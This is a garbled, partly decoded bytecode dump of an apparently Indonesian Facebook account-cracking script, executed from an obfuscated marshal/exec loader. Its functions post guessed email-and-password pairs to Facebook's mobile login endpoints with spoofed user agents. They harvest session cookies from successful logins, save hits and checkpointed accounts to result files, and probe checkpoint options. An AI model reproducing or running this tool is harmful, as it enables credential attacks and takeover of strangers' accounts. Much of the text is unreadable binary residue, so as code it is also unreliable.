r.   )"rh   ri   r�   r   r7   r8   rm   r�   rq   r�   r   r�   �okr�   �cpr9   r3   r   r}   r   r   rS   r   r   r   r�   r�   r�   ry   r[   rk   r�   r�   �cek_log�r�   r�   r�   �pwZheaders_�ses�send�ttlr�   r�   r�   r   r   r   r�   �  sN   �Z
:&0"r�   c                 C   s�  z	t dd��� }W n ty   d}Y nw tj�dt� dt� dt� dt	t
�� dt� dt� t	t�� dt� d	t� t	t�� �� tj��  |D �]}|�� }tt�d
d��tt�dd��tt�dd��dd|ddd�}t�� }|jdt| � d t|� d |d�}d|jv r�d|jv r�tdt� dt� | � d|� �� t�d| |f � t dt d��d| |f �  n�d|�� d  v �rXz`t d!d��� ad"t d#d��� ia|jd$| tf td%��� d& }|�d�\}}	}
t| }tdt� dt� | � d|� d|	� d|� d|
� �� t�d| |f � t d't d��d(| ||	||
f � W  n> t tf�y,   d}	d}d}
Y n   Y tdt� dt� | � d|� �� t�d| |f � t d't d��d| |f �  nqDtd)7 ad S r�   )!rh   ri   r�   r   r7   r8   rm   r�   rq   r�   r   r�   r�   r�   r�   r9   r3   r   r}   r   r   rS   r   r   r   r�   r�   r�   ry   r[   rk   r�   r�   r�   r   r   r   r�   �  sL   �Z
:&0"r�   c                 C   s|  z	t dd��� }W n ty   d}Y nw tj�dt� dt� dt� dt	t
�� dt� dt� t	t�� dt� d	t� t	t�� �� tj��  |D �]r}i }|�� }t�� }|j�d
ddd|dddddd�
� |�d�j}t|d�}g d�}|d�D ] }	z|	�d�|v r�|�|	�d�|	�d�i� nW quW qu   Y qu|�| |dddddddddd�� |jd|d�}
d |j�� �� v r�d!�d"d#� |j�� �� D ���d$d�}tdt� d%t� | � d&|� �� t� d'| |f � t d(t! d)��d*| |f �  n�d+|j�� �� v �r�zwt d,d��� a"d-t d.d��� ia#t�� �X}|jd/| t"f t#d0��$� d1 }|�%d�\}}}t&| }tdt� d%t� | � d&|� d&|� d|� d|� �� t� d'| |f � t d2t! d)��d3| ||||f � 	 W d   � W  nO1 �smw   Y  W n t'tf�y�   d}d}d}Y n   Y t(| ||� tdt� d%t� | � d&|� �� t� d'| |f � t d(t! d)��d*| |f �  nqDtd47 ad S )5Nr�   rb   r�   r�   r�   r�   r�   r�   r�   r	   r�   �gzip, deflater�   �mbasic.facebook.com�:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8r�   r�   r�   �
r�   r�   �accept-encodingr�   rA   �Hostr�   r�   r�   r�   �7https://mbasic.facebook.com/login/?next&ref=dbl&refid=8rJ   ��lsdrO   �m_ts�li�
try_number�unrecognized_triesrB   r�   r�   �valuer   �false�true��email�passZprefill_contact_pointZprefill_sourceZprefill_typeZfirst_prefill_sourceZfirst_prefill_typeZhad_cp_prefilledZhad_password_prefilledZis_smart_lockZ_fb_noscript�yhttps://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8�rR   �c_user�;c                 S   �   g | ]
\}}d ||f �qS �z%s=%sr   ��.0r�   r	  r   r   r   �
<listcomp>  �    zmbasic.<locals>.<listcomp>�noscript=1;r�   r�   r�   r�   rc   r�   �
checkpointrD   r[   rC   r�   rH   r�   r�   r�   r.   �)rh   ri   r�   r   r7   r8   rm   r�   rq   r�   r   r�   r�   r�   r�   r9   r3   r   rS   r�   �updater   r   �parserrM   rI   �get_dict�keysr   �items�replacer   r�   r�   ry   r[   r�   rk   �	bulan_ttlr�   r�   �r�   r�   r�   r�   Zfii_gtgr�   �p�bZblr�   ZdekuZkukir�   r�   r�   r�   r   r   r   r�   �  �j   �Z
"
*�
"&
0"(�r�   c                 C   �p  z	t dd��� }W n ty   d}Y nw tj�dt� dt� dt� dt	t
�� dt� dt� t	t�� dt� d	t� t	t�� �� tj��  |D �]l}i }|�� }t�� }|j�d
ddd|dddddd�
� |�d�j}t|d�}g d�}|d�D ] }	z|	�d�|v r�|�|	�d�|	�d�i� nW quW qu   Y qu|�| |dddddddddd�� |jd|d�}
d |j�� �� v r�d!�d"d#� |j�� �� D ���d$d�}tdt� d%t� | � d&|� �� t� d'| |f � t d(t! d)��d*| |f �  n�d+|j�� �� v �r�zwt d,d��� a"d-t d.d��� ia#t�� �X}|jd/| t"f t#d0��$� d1 }|�%d�\}}}t&| }tdt� d%t� | � d&|� d&|� d|� d|� �� t� d'| |f � t d2t! d)��d3| ||||f � 	 W d   � W  nI1 �smw   Y  W n t'tf�y�   d}d}d}Y n   Y tdt� d%t� | � d&|� �� t� d'| |f � t d2t! d)��d*| |f �  nqDtd47 ad S )5Nr�   rb   r�   r�   r�   r�   r�   r�   r�   r	   r�   r�   r�   r�   r�   r�   r�   r�   r�   r  rJ   r  r�   r�   r	  r   r
  r  r  r  r  r  r  c                 S   r  r  r   r  r   r   r   r  :  r  zmbasicc.<locals>.<listcomp>r  r�   r�   r�   r�   rc   r�   r  rD   r[   rC   r�   rH   r�   r�   r�   r.   �(rh   ri   r�   r   r7   r8   rm   r�   rq   r�   r   r�   r�   r�   r�   r9   r3   r   rS   r�   r  r   r   r  rM   rI   r  r  r   r   r!  r   r�   r�   ry   r[   r�   rk   r"  r�   r#  r   r   r   r�   #  �h   �Z
"
*�
"&
0"(�r�   c                 C   s|  z	t dd��� }W n ty   d}Y nw tj�dt� dt� dt� dt	t
�� dt� dt� t	t�� dt� d	t� t	t�� �� tj��  |D �]r}i }|�� }t�� }|j�d
ddd|dddddd�
� |�d�j}t|d�}g d�}|d�D ] }	z|	�d�|v r�|�|	�d�|	�d�i� nW quW qu   Y qu|�| |dddddddddd�� |jd|d�}
d |j�� �� v r�d!�d"d#� |j�� �� D ���d$d�}tdt� d%t� | � d&|� �� t� d'| |f � t d(t! d)��d*| |f �  n�d+|j�� �� v �r�zwt d,d��� a"d-t d.d��� ia#t�� �X}|jd/| t"f t#d0��$� d1 }|�%d�\}}}t&| }tdt� d%t� | � d&|� d&|� d|� d|� �� t� d'| |f � t d2t! d)��d3| ||||f � 	 W d   � W  nO1 �smw   Y  W n t'tf�y�   d}d}d}Y n   Y t(| ||� tdt� d%t� | � d&|� �� t� d'| |f � t d2t! d)��d*| |f �  nqDtd47 ad S )5Nr�   rb   z{nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+r�   r�   r�   r�   r�   r�   zhttps://mobile.facebook.comr�   r�   r�   r�   r�   r�   r�   r�   r�   �7https://mobile.facebook.com/login/?next&ref=dbl&refid=8rJ   r  r�   r�   r	  r   r
  r  r  �yhttps://mobile.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8r  r  r  c                 S   r  r  r   r  r   r   r   r  p  r  zmobil.<locals>.<listcomp>r  r�   r�   r�   r�   rc   r�   r  rD   r[   rC   r�   rH   r�   r�   r�   r.   r  r#  r   r   r   r�   Y  r&  r�   c                 C   r'  )5Nr�   rb   r�   r�   r�   r�   r�   r�   r�   r	   r�   r�   r�   r�   r�   r�   r�   r�   r�   r*  rJ   r  r�   r�   r	  r   r
  r  r  r+  r  r  r  c                 S   r  r  r   r  r   r   r   r  �  r  zmobill.<locals>.<listcomp>r  r�   r�   r�   r�   rc   r�   r  rD   r[   rC   r�   rH   r�   r�   r�   r.   r(  r#  r   r   r   r�   �  r)  r�   c                 C   s�  d}t �� }g }|j�ddd|d|dddd	d
d|d ddd�� i }t|j|d d|id�jd�}|�dddi�}g d�}	|�d�D ]}
|
�d�|	v rY|�|
�d�|
�d�i� qBqB|�| |d�� t|j	||�d� |dd�jd�}d|j
v �r|�d�}|�dddi�d }|�ddd i�d }|�ddd!i�d }||||d"d#|d$�}t|j	||d  |d%�jd�}d&d'� |�d(�D �}td)t� d*t� d+t� | � d,|� �	� tt|��D ]"}tt� d-t� t|d. �� t� d/t� d0t� d-t� || � t� �� q�d1tt|��v �rtt� d*t� d2�� d S d S d3t|�v �r,td)t� d*t� d4t� | � d,|� �	� d S td)t� d*t� d4t� | � d,|� �	� d S )5Nr	   r�   r�   r�   r�   z|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9zmark.via.gpzsame-originZnavigatez?1Zdocumentz/login/?next&ref=dbl&fl&refid=8r�   r�   )r  r�   r�   r�   r�   rA   r�   zx-requested-withzsec-fetch-sitezsec-fetch-modezsec-fetch-userzsec-fetch-destr�   r   r�   rA   r�   rJ   rK   rL   rM   )r  rO   r  r  r  r  rB   Zbi_xrwhr�   r�   r	  )r  r  rQ   T)rR   Zallow_redirectsr  rN   rO   �nhr   Z	Lanjutkan)rN   rN   rO   rO   Zcheckpoint_datazsubmit[Continue]r,  r  c                 S   s   g | ]}|j �qS r   )r   )r  Zyyr   r   r   r  �  s    zcek_log.<locals>.<listcomp>�optionr�   r�   z-----> r�   �[r.   r�   z>>>>>r�   z: Hooray the account is yesss tab, please login on fb lite Zlogin_errorzCHECK ----> )r   rS   r�   r  r  r   r   rj   rV   rM   rI   r   rm   r�   r�   r�   r�   r>   �Ur   r�   )r�   r�   r�   Zmbr�   r-  rR   ZgedZfm�listr�   �runrK   ZdtsgZjzstr,  ZdataDZtempekZngewZoptr   r   r   r�   �  s>   0"
$B�((r�   �__main__r/   )dZAuthorZVersionrs   Z	Postinganr   r�   r   Zbs4r   r   r}   r:   rW   r�   r   �
subprocessr   Zconcurrent.futuresr   Z
ThreadPoolZrequests.exceptionsr   r   rT   r  r   r   Zurllib.parser   �Zr�   �Hr�   r�   r/  r�   rm   �J�A�ImportErrorr   r4   Z
concurrentr�   r~   r   r   r�   Zskrngr�   Ztahunr�   Zbulanr�   Zharir"  Z	bulan_cekr   Zbulan_skrng�
ValueErrorr�   r�   r   r�   r�   rq   r5   r>   r�   r�   Zkata_devr�   Zm_fbr�   Zheader_gruprG   ra   rl   ro   rp   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r   r   r   r   �<module>   s�   P���
�',# ~++7676
#

�)�marshal�exec�loads� r   r   �0.py�<module>   s    